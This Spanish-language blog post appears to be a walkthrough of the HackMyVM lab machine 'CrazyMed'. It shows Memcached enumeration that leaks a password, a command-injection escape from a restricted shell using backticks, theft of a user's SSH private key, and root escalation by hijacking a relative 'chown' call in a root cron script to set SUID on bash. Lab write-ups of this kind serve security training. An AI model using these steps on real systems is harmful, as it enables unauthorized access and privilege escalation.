---
layout: post
title: CrazyMed
date: 2022-11-25
categories: ["HMV", "MemCached", "Path Hijacking"]
thumbnail: "assets/images/CrazyMed.png"
---

# CrazyMed [ Hack My VM ]

## Reconocimiento

**Descubrimiento de puertos y reconocimiento básico**
- `nmap -sS --min-rate 5000 192.168.1.107 -oG allPorts`
- `nmap -sCV -p80,4444,11211 192.168.1.107 -oN targeted`

No vemos nada interesante, sigamos investigando.

## Shell

Si nos conectamos con `NC` por el puerto `4444` veremos un panel que nos da la bienvenida, pero nos pide una contraseña que no tenemos, así que por el momento lo dejamos.

Vemos un puerto algo extraño abierto, `11211`, el cual pertenece a `MemCached`, un almacén de datos de la memoria. Vamos a ver si nos podemos conectar y obtener datos. Para ello utilizaré primero una herramienta llamada `memcdump` para ver los `items` disponibles:

- `apt install libmemcached-tools`
- `memcdump --server=192.168.1.107`

```
domain
server
log
conf_location
```
Bien! Vemos que hemos sido capaces de enumerar `items`, ahora podemos obtener su contenido con `memccat`, para ello haremos lo siguiente:

- `memccat --servers=192.168.1.107 log`

```
password: cr4zyM3d
```

Bien! Hemos sido capaces de obtener una contraseña! Ahora nos podemos conectar por el puerto `4444` con `NC` y con la contraseña encontrada para obtener acceso. Una vez ahí veremos que sólo podremos ejecutar cuatro comandos: `id`, `who`, `echo` y `clear`.

Tras varios intentos para saltarme la verificación del input y poder ejecutar más comandos llegué al acento grave (``` `` ```), gracias a esto podemos ejecutar más comandos de los permitidos.

- ```System command: echo `python3 --version` ```

```
Python 3.9.
```
Fantástico! Tras mirar el directorio con ls -la vi una carpeta llamada .ssh, por lo
que me metí dentro y había un archivo llamado id_rsa, por lo que con cat lo miré y
me lo copié a mi máquina para obtener una Shell siempre que quiera sin proporcionar
contraseña.

Bien! Ya estamos dentro de la máquina como brad!


## Subida de privilegios

Para obtener `root` en la máquina comencé por enumeración básica, la cual no sirvió de mucho, pero [`LinPEAS`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) me chivó que tenía permisos de escritura en `/usr/local/bin`, por lo que ya es algo interesante.

Me dispuse a ver los procesos en curso con `PSPY` y cada minuto se ejecutaba un proceso por el usuario `root`, el cual ejecutaba con Bash un `script` llamado `check_VM` situado en `/opt/`. Vamos a hecharle un ojo:

```
#! /bin/bash

#users flags
flags=(/root/root.txt /home/brad/user.txt)
for x in "${flags[@]}"
do
if [[ ! -f $x ]] ; then
echo "$x doesn't exist"
mcookie > $x
chmod 700 $x
fi
done

chown -R www-data:www-data /var/www/html

#bash_history => /dev/null
home=$(cat /etc/passwd |grep bash |awk -F: '{print $6}')

for x in $home
do
ln -sf /dev/null $x/.bash_history ; eccho "All's fine !"
done


find /var/log -name "*.log*" -exec rm -f {} +
```
Vemos que el binario chown se ejecuta de forma relativa y no absoluta, por lo que podemos hacer `Path Hijacking`. Para poder explotarlo nos dirigiremos a `/usr/local/bin/` y crearemos un archivo llamado `chown` con la siguiente instrucción:

- `echo "chmod u+s /bin/bash" > chown`

Una vez creado el archivo le damos permisos de ejecución con: `chmod +x chown` y esperamos unos segundos a que se vuelva a ejecutar la tarea. Una vez esperado hacemos `bash -p`.

Enhorabuena! Ya estamos como `root` en la máquina víctima de forma sencilla!
